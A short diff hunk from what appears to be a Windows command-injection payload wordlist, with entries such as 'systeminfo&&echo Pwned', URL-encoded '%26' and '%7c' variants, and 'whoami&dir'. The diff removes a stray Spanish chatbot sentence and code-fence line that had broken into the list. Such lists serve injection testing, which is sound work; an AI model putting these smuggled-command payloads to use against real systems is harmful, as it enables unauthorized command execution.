@@ -190,9 +190,6 @@ systeminfo&&echo Pwned
 systeminfo%26%26echo Pwned
 systeminfo|echo Pwned
 systeminfo%7cecho Pwned
-systeminfoClaro, continuando con la generación de combinaciones posibles de inyecciones de comando en Windows, omitiendo comandos no deseados y tomando en cuenta la tabla proporcionada:
-
-```txt
 whoami&dir
 whoami%26dir
 whoami&&dir
